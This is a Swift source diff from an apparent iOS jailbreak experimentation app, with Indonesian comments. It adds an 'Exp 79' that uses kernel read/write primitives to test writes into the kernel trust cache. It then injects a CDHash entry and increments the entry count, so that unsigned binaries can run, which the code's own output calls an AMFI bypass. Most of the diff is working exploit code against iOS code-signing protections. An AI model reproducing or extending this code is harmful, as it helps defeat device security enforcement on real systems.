@@ -609,6 +609,10 @@ struct AMFIExperimentView: View {
     @State private var isRunning = false
     @State private var runningLabel = ""
     @State private var customBinary = "/usr/bin/id"
+    // Exp 79: simpan hasil probe untuk dipakai inject
+    @State private var probedTCAddr: UInt64 = 0
+    @State private var probedTCCount: UInt32 = 0
+    @State private var probedTCStride: UInt32 = 24
 
     struct ExperimentResult: Identifiable {
         let id = UUID()
@@ -663,14 +667,25 @@ struct AMFIExperimentView: View {
                     needsVerified: true
                 )
 
-                HStack {
-                    Label("③ Trust Cache Inject", systemImage: "key.fill")
-                        .foregroundStyle(.secondary)
-                    Spacer()
-                    Text("Nonaktif (PPL panic)")
-                        .font(.caption2)
-                        .foregroundStyle(.orange)
-                }
+                pathButton(
+                    title: "③ Write Test (Exp 79 — harmless)",
+                    icon: "pencil.and.scribble",
+                    color: .yellow,
+                    label: "Write Test",
+                    action: runExp79WriteTest,
+                    needsVerified: true,
+                    needsProbe: true
+                )
+
+                pathButton(
+                    title: "③b CDHash Inject (Exp 79 — jika write test OK)",
+                    icon: "key.fill",
+                    color: .orange,
+                    label: "TC Inject",
+                    action: runExp79Inject,
+                    needsVerified: true,
+                    needsProbe: true
+                )
 
                 pathButton(
                     title: "④ Test Binary Spawn",
@@ -686,7 +701,7 @@ struct AMFIExperimentView: View {
             } header: {
                 Label("Jailbreak Path", systemImage: "flag.checkered")
             } footer: {
-                Text("② Probe pakai offset kernelcache + XPF. Fetch kernelcache (Settings) dulu. ③ setelah ② hijau.")
+                Text("② Probe pakai offset kernelcache + XPF. ③ Write Test dulu sebelum inject — jika write silently ignored, perlu jalur lain. ③b hanya jika write test OK.")
                     .font(.system(size: 9))
             }
 
@@ -885,6 +900,56 @@ struct AMFIExperimentView: View {
     private func runExp78() {
         runExperiment(label: "DART", operation: "exp78_dart", append: true) { rc in
             self.expDARTPTEProbe(rc: rc)
+        }
+    }
+
+    /// Exp 79 Tahap 1: Write test — tulis sentinel ke slot kosong, verify, restore.
+    /// Tidak memodifikasi entry yang ada. Aman untuk dijalankan.
+    private func runExp79WriteTest() {
+        isRunning = true
+        runningLabel = "Write Test"
+        guard mgr.dsready, PhysmapConstants.isVerified, PhysmapConstants.isProbeOK else {
+            isRunning = false
+            runningLabel = ""
+            return
+        }
+        DispatchQueue.global(qos: .userInitiated).async {
+            let result = self.expWriteTest()
+            DispatchQueue.main.async {
+                self.results.insert(result, at: 0)
+                self.isRunning = false
+                self.runningLabel = ""
+            }
+        }
+    }
+
+    /// Exp 79 Tahap 2: CDHash inject — hanya jika write test sukses.
+    private func runExp79Inject() {
+        isRunning = true
+        runningLabel = "TC Inject"
+        guard mgr.dsready, PhysmapConstants.isVerified, PhysmapConstants.isProbeOK else {
+            isRunning = false
+            runningLabel = ""
+            return
+        }
+        guard probedTCAddr != 0 else {
+            results.insert(ExperimentResult(
+                name: "TC Inject (Exp 79)",
+                success: false,
+                detail: "❌ Jalankan Write Test dulu — tc_addr belum diset.\nProbe ulang Exp 77 jika perlu.",
+                timestamp: Date()
+            ), at: 0)
+            isRunning = false
+            runningLabel = ""
+            return
+        }
+        DispatchQueue.global(qos: .userInitiated).async {
+            let result = self.expInjectCDHash()
+            DispatchQueue.main.async {
+                self.results.insert(result, at: 0)
+                self.isRunning = false
+                self.runningLabel = ""
+            }
         }
     }
     
@@ -4567,12 +4632,217 @@ struct AMFIExperimentView: View {
         }
 
         detail += "\n✅ PROBE OK — trust cache ditemukan (tanpa physmap read).\n"
-        detail += "Physmap write/inject masih butuh pmap L1 valid — gunakan ③ hanya jika siap risiko panic.\n"
+        detail += "Lanjut ke ③ Write Test untuk verifikasi apakah __DATA bisa ditulis via KRW.\n"
         PhysmapConstants.markProbeOK()
+
+        // Simpan hasil probe ke state untuk dipakai Exp 79
+        let savedAddr = tcStructAddr
+        let savedCount = UInt32(tcEntryCount)
+        DispatchQueue.main.async {
+            self.probedTCAddr = savedAddr
+            self.probedTCCount = savedCount
+            self.probedTCStride = 24  // default; update jika stride 32 terbukti lebih baik
+        }
+
         return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
     }
 
-    /// PPL bypass via physmap write:
+    // MARK: - Exp 79: Write Test + CDHash Inject
+
+    /// Exp 79 Tahap 1: Write test harmless ke slot kosong di trust cache.
+    /// Tulis sentinel, verify readback, restore. Tidak memodifikasi entry yang ada.
+    /// Hasil: tahu apakah __DATA bisa ditulis via KRW (atau KTRR-protected).
+    private func expWriteTest() -> ExperimentResult {
+        let expName = "Write Test (Exp 79)"
+        var detail = "Experiment 79: Trust Cache Write Test\n"
+        detail += "======================================\n\n"
+
+        guard PhysmapConstants.isProbeOK else {
+            detail += "❌ Jalankan Exp 77 Probe dulu.\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        let tcAddr = probedTCAddr
+        let tcCount = probedTCCount
+        let tcStride = UInt64(probedTCStride)
+
+        guard tcAddr != 0 else {
+            detail += "❌ tc_addr = 0 — probe ulang Exp 77 dulu.\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        detail += "tc_addr:  0x\(String(format: "%llx", tcAddr))\n"
+        detail += "count:    \(tcCount)\n"
+        detail += "stride:   \(tcStride) bytes\n\n"
+
+        // Slot tepat setelah entry terakhir — area tidak dipakai, aman untuk test
+        let testAddr = tcAddr &+ 8 &+ UInt64(tcCount) * tcStride
+        detail += "test_addr: 0x\(String(format: "%llx", testAddr))\n"
+
+        // Validasi alamat aman
+        let kernBase = ds_get_kernel_base()
+        let dataOff = ds_kcache_analyze_data_offset() != 0 ? ds_kcache_analyze_data_offset() : PhysmapConstants.dataOffsetFromText
+        let dataSegBase = kernBase &+ dataOff
+        let pplDataBase = dataSegBase &+ PhysmapConstants.pplDataOffsetFromData
+
+        guard isSafeTrustCacheStructVA(testAddr, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase) else {
+            detail += "❌ test_addr tidak aman (mungkin PPL region atau out of bounds).\n"
+            detail += "  dataSegBase: 0x\(String(format: "%llx", dataSegBase))\n"
+            detail += "  pplDataBase: 0x\(String(format: "%llx", pplDataBase))\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        // Baca nilai asli
+        let original = ds_kread64(testAddr)
+        detail += "original:  0x\(String(format: "%016llx", original))\n"
+
+        // Tulis sentinel
+        let sentinel: UInt64 = 0xDEADBEEFCAFEBABE
+        detail += "sentinel:  0x\(String(format: "%016llx", sentinel))\n"
+        ds_kwrite64(testAddr, sentinel)
+
+        // Verify
+        let readback = ds_kread64(testAddr)
+        detail += "readback:  0x\(String(format: "%016llx", readback))\n\n"
+
+        // Restore segera
+        ds_kwrite64(testAddr, original)
+        let restored = ds_kread64(testAddr)
+        detail += "restored:  0x\(String(format: "%016llx", restored))\n\n"
+
+        if readback == sentinel {
+            detail += "✅ WRITE TEST OK!\n"
+            detail += "__DATA dapat ditulis via KRW — bukan KTRR-protected.\n"
+            detail += "Lanjut ke ③b CDHash Inject.\n"
+            return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
+        } else if readback == original {
+            detail += "❌ WRITE SILENTLY IGNORED\n"
+            detail += "Kemungkinan: KTRR/CTRR protection atau region read-only.\n"
+            detail += "KRW write tidak efektif di sini.\n"
+            detail += "Jalur alternatif: trust_cache_runtime_add via launchd RemoteCall.\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        } else {
+            detail += "⚠️ UNEXPECTED readback: 0x\(String(format: "%016llx", readback))\n"
+            detail += "Bukan sentinel, bukan original — kemungkinan race condition.\n"
+            detail += "Coba ulang setelah reboot + jailbreak ulang.\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+    }
+
+    /// Exp 79 Tahap 2: Inject CDHash binary target ke trust cache.
+    /// Hanya jalankan setelah write test sukses.
+    private func expInjectCDHash() -> ExperimentResult {
+        let expName = "CDHash Inject (Exp 79)"
+        var detail = "Experiment 79: CDHash Inject\n"
+        detail += "============================\n\n"
+
+        let tcAddr = probedTCAddr
+        let tcCount = probedTCCount
+        let tcStride = UInt64(probedTCStride)
+
+        guard tcAddr != 0 else {
+            detail += "❌ tc_addr = 0 — probe ulang Exp 77 dulu.\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        detail += "tc_addr:  0x\(String(format: "%llx", tcAddr))\n"
+        detail += "count:    \(tcCount)\n"
+        detail += "stride:   \(tcStride) bytes\n\n"
+
+        // CDHash target: /usr/bin/id (untuk test — ganti dengan binary unsigned kamu)
+        // Untuk sekarang pakai dummy CDHash — user harus ganti dengan CDHash binary target
+        // CDHash bisa didapat dari: codesign -d --verbose=4 /path/to/binary
+        let dummyCDHash: [UInt8] = [
+            0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
+            0x13, 0x37, 0x13, 0x37, 0x13, 0x37, 0x13, 0x37,
+            0xDE, 0xAD, 0xC0, 0xDE
+        ]
+
+        detail += "⚠️ PERHATIAN: CDHash di bawah adalah DUMMY untuk test.\n"
+        detail += "Ganti dengan CDHash binary unsigned yang ingin dijalankan.\n"
+        detail += "CDHash: \(dummyCDHash.map { String(format: "%02x", $0) }.joined())\n\n"
+
+        // Slot inject
+        let slotAddr = tcAddr &+ 8 &+ UInt64(tcCount) * tcStride
+        detail += "inject slot: 0x\(String(format: "%llx", slotAddr))\n\n"
+
+        // Validasi
+        let kernBase = ds_get_kernel_base()
+        let dataOff = ds_kcache_analyze_data_offset() != 0 ? ds_kcache_analyze_data_offset() : PhysmapConstants.dataOffsetFromText
+        let dataSegBase = kernBase &+ dataOff
+        let pplDataBase = dataSegBase &+ PhysmapConstants.pplDataOffsetFromData
+
+        guard isSafeTrustCacheStructVA(slotAddr &+ 16, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase) else {
+            detail += "❌ slot addr tidak aman.\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        // Tulis CDHash entry (stride=24):
+        // [0..7]   cdhash bytes 0-7
+        // [8..15]  cdhash bytes 8-15
+        // [16..19] cdhash bytes 16-19
+        // [20]     hash_type = 2 (SHA256)
+        // [21]     flags = 0
+        // [22..23] padding
+
+        var w0: UInt64 = 0; withUnsafeMutableBytes(of: &w0) { ptr in
+            for i in 0..<8 { ptr[i] = dummyCDHash[i] }
+        }
+        var w1: UInt64 = 0; withUnsafeMutableBytes(of: &w1) { ptr in
+            for i in 0..<8 { ptr[i] = dummyCDHash[8 + i] }
+        }
+        var w2: UInt64 = 0; withUnsafeMutableBytes(of: &w2) { ptr in
+            for i in 0..<4 { ptr[i] = dummyCDHash[16 + i] }
+            ptr[4] = 2      // hash_type = SHA256
+            ptr[5] = 0      // flags = normal
+            ptr[6] = 0      // pad
+            ptr[7] = 0      // pad
+        }
+
+        ds_kwrite64(slotAddr &+ 0,  w0)
+        ds_kwrite64(slotAddr &+ 8,  w1)
+        ds_kwrite64(slotAddr &+ 16, w2)
+
+        // Verify tulis
+        let rb0 = ds_kread64(slotAddr &+ 0)
+        let rb1 = ds_kread64(slotAddr &+ 8)
+        let rb2 = ds_kread64(slotAddr &+ 16)
+        detail += "Written:\n"
+        detail += "  +0x00: 0x\(String(format: "%016llx", rb0))\n"
+        detail += "  +0x08: 0x\(String(format: "%016llx", rb1))\n"
+        detail += "  +0x10: 0x\(String(format: "%016llx", rb2))\n\n"
+
+        guard rb0 == w0 && rb1 == w1 else {
+            detail += "❌ Verify gagal — write tidak efektif (KTRR?).\n"
+            detail += "Jalankan Write Test dulu untuk konfirmasi.\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        // Update count
+        let oldCount = ds_kread32(tcAddr &+ 4)
+        let newCount = oldCount + 1
+        ds_kwrite32(tcAddr &+ 4, newCount)
+        let verifyCount = ds_kread32(tcAddr &+ 4)
+        detail += "count: \(oldCount) → \(newCount) (verify: \(verifyCount))\n\n"
+
+        if verifyCount != newCount {
+            detail += "❌ Count update gagal — kemungkinan KTRR.\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        // Update state
+        DispatchQueue.main.async {
+            self.probedTCCount = newCount
+        }
+
+        detail += "✅ INJECT OK — CDHash masuk ke trust cache!\n"
+        detail += "count sekarang: \(newCount)\n\n"
+        detail += "Langkah selanjutnya:\n"
+        detail += "1. Ganti dummyCDHash dengan CDHash binary unsigned target\n"
+        detail += "2. Jalankan ④ Test Binary Spawn dengan path binary tersebut\n"
+        detail += "3. Jika spawn berhasil tanpa SIGKILL → AMFI BYPASS CONFIRMED!\n"
+        return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
+    }
     /// 1. Walk page tables (L1→L2→L3) to find trust cache's PHYSICAL address
     /// 2. Compute physmap VA for that physical page (bypasses PPL!)
     /// 3. Write CDHash through physmap VA (PPL only protects original VA mapping)
